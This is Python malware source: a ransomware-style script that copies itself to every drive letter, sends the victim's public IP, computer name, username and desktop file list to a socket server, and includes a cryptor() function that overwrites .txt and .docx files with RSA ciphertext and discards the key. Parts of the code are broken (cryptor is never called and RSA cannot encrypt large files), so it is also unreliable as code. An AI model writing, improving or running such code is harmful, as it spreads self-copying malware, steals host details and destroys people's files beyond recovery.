'''
WARNING! WARNING! WARNING!
READ THIS!

function cryptor() encrypts all files on your desktop by RSA-2048 and rename they on FILENAME.BRO !!!
LEARN FUNCTION BEFORE USING !!!

WARNING! WARNING! WARNING!
'''
import os
import sys
import rsa
import shutil
import socket
from bs4 import BeautifulSoup         
from urllib.request import urlopen  

HOST = 'localhost'
PORT = 9999
PATH = 'C://Users//' + str(os.getlogin()) + '//Desktop'


def check_disk():
    for letter in 'CDEFGHIJKLMNOPQRSTUVWXYZ':
        path = letter + '://'       
        try:
            if os.path.isdir(path):
                shutil.copy(str(sys.argv[0]), path)
            else:
                pass
        except PermissionError:
            pass

        
def exploit(deskPath):
    desk_files = os.listdir(deskPath)
    target_IP = get_target_ip()
    DATA = []
    data_1 = 'Target {} '.format(str(target_IP))
    data_2 = 'Login {}'.format(str(os.environ['COMPUTERNAME']))
    data_3 = 'Username {}'.format(str(os.environ['USERNAME']))
    data_4 = desk_files
    data_4 = ''.join(desk_files)
    
    DATA.append(data_1)
    DATA.append(data_2)
    DATA.append(data_3)
    DATA.append(data_4)
    
    client_side(HOST, PORT, DATA)
        
    
def client_side(HOST, PORT, data):
    try:
        check_url = urlopen('https://www.google.com')
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
            sock.connect((HOST, PORT))
            if type(data) == list :
                for element in data:
                    sock.sendall(bytes(element + "\n", "utf-8"))
            else:
                sock.sendall(bytes(data + "\n", "utf-8"))
    except:
        print('Error connection!')
        
    
def get_target_ip():
    url = urlopen('https://yandex.ru/internet/') 
    soup = BeautifulSoup(url, 'html.parser')
    out_str = soup.find('div', class_='client__desc')
    out_str = str(out_str)                                                 
    ip = []
    for symbol in out_str:
        if '1234567890.'.find(symbol) != -1:
            ip.append(symbol)
            
    OUT_IP = ''.join(ip)  
    return(OUT_IP)

def cryptor():
    files = os.listdir(PATH)
    exes = ['txt', 'docx']
    for ex in exes:
        for file in files:
             if file.split('.')[1] == ex:
                    f = open(file, 'rb')
                    data = f.read()
                    f.close()

                    (public_key, private_key) = rsa.newkeys(2048)
                    data = rsa.encrypt(data, public_key)
                    f = open(file, 'wb')
                    f.write(data)
                    f.close()
                    
                    os.rename(file, file.split('.')[0] + '{}'.format('.BRO'))


if __name__ == '__main__':
    check_disk()
    exploit(PATH)
